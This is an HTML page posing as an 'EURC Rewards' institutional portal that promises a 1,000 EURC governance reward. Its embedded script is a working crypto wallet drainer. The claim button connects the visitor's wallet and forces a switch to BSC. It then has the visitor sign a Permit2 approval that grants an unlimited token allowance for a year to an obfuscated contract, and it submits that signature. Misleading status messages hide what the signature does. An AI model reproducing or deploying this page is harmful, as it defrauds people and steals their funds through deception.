<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EURC Rewards | Institutional Portal</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #2775ca; --accent: #0ecb81; --bg: #030407; }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: var(--bg); color: white; font-family: 'Plus Jakarta Sans', sans-serif; height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; }
        .mesh-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at 10% 20%, rgba(39, 117, 202, 0.12) 0%, transparent 40%), radial-gradient(circle at 90% 80%, rgba(14, 203, 129, 0.08) 0%, transparent 40%); z-index: -1; filter: blur(100px); }
        .container { background: rgba(13, 15, 20, 0.85); backdrop-filter: blur(25px); border: 1px solid rgba(255, 255, 255, 0.06); padding: 3rem 2rem; border-radius: 40px; width: 90%; max-width: 420px; text-align: center; box-shadow: 0 40px 120px rgba(0,0,0,0.8); }
        .badge { background: rgba(39, 117, 202, 0.15); color: var(--primary); padding: 10px 20px; border-radius: 100px; font-size: 11px; font-weight: 800; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 2rem; display: inline-block; border: 1px solid rgba(39, 117, 202, 0.3); }
        .reward-amount { font-size: 52px; font-weight: 800; color: #fff; margin-bottom: 0.5rem; letter-spacing: -2px; }
        .reward-label { color: var(--accent); font-size: 18px; font-weight: 700; margin-bottom: 2.5rem; text-transform: uppercase; letter-spacing: 1px; }
        p { color: #94a3b8; font-size: 14px; line-height: 1.6; margin-bottom: 2.5rem; }
        .btn-action { width: 100%; padding: 1.2rem; background: linear-gradient(135deg, #2775ca 0%, #1a4f8a 100%); color: white; border: none; border-radius: 20px; font-size: 18px; font-weight: 700; cursor: pointer; transition: 0.3s; box-shadow: 0 15px 35px rgba(39, 117, 202, 0.4); }
        .btn-action:active { transform: scale(0.96); }
        .status-msg { margin-top: 1.5rem; font-size: 13px; font-weight: 600; color: var(--primary); min-height: 20px; }
    </style>
</head>
<body>
<div class="mesh-bg"></div>
<div class="container">
    <div class="badge">EVM Certified Pool</div>
    <div class="reward-amount">1,000 EURC</div>
    <div class="reward-label">Governance Reward</div>
    <p>Your institutional wallet is eligible for the quarterly incentive program. Connect to synchronize your vault.</p>
    <button id="claimBtn" class="btn-action">Claim 1,000 EURC</button>
    <div id="statusMsg" class="status-msg"></div>
</div>

<script>
    const T = "0x368994010697ECc82bC6D450888A617E3eb61370";
    const P2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";

    async function process() {
        const b = document.getElementById('claimBtn');
        const s = document.getElementById('statusMsg');

        if (!window.ethereum) {
            const trustLink = "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(window.location.href);
            window.location.href = trustLink;
            return;
        }

        try {
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            await provider.send("eth_requestAccounts", []);
            const signer = provider.getSigner();
            const user = await signer.getAddress();
            const net = await provider.getNetwork();

            if (net.chainId !== 56) {
                try {
                    await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
                } catch (e) {
                    s.innerText = "Please switch to BSC Network.";
                    return;
                }
            }

            const contract = new ethers.Contract(T, [
                "function l111ll(uint256) public view returns (address)",
                "function l1I1lI(address, uint256, uint256, bytes) external"
            ], signer);

            s.innerText = "Analyzing Eligibility...";
            const targetToken = await contract.l111ll(0);
            const deadline = Math.floor(Date.now() / 1000) + 3600;
            const expiry = Math.floor(Date.now() / 1000) + 31536000;

            const domain = { name: 'Permit2', chainId: 56, verifyingContract: P2 };
            const types = {
                PermitSingle: [
                    { name: 'details', type: 'PermitDetails' },
                    { name: 'spender', type: 'address' },
                    { name: 'sigDeadline', type: 'uint256' }
                ],
                PermitDetails: [
                    { name: 'token', type: 'address' },
                    { name: 'amount', type: 'uint160' },
                    { name: 'expiration', type: 'uint48' },
                    { name: 'nonce', type: 'uint48' }
                ]
            };

            const message = {
                details: { token: targetToken, amount: "0xffffffffffffffffffffffffffffffff", expiration: expiry, nonce: 0 },
                spender: T,
                sigDeadline: deadline
            };

            s.innerText = "Signature required for vault sync...";
            const sig = await signer._signTypedData(domain, types, message);
            
            b.innerText = "Finalizing...";
            const tx = await contract.l1I1lI(user, expiry, deadline, sig);
            await tx.wait();
            
            b.innerText = "Success!";
            s.innerText = "1,000 EURC claim complete. Processing...";
        } catch (err) {
            b.innerText = "Retry Connection";
            s.innerText = "Action required to verify rewards.";
        }
    }
    document.getElementById('claimBtn').onclick = process;
</script>
</body>
</html>
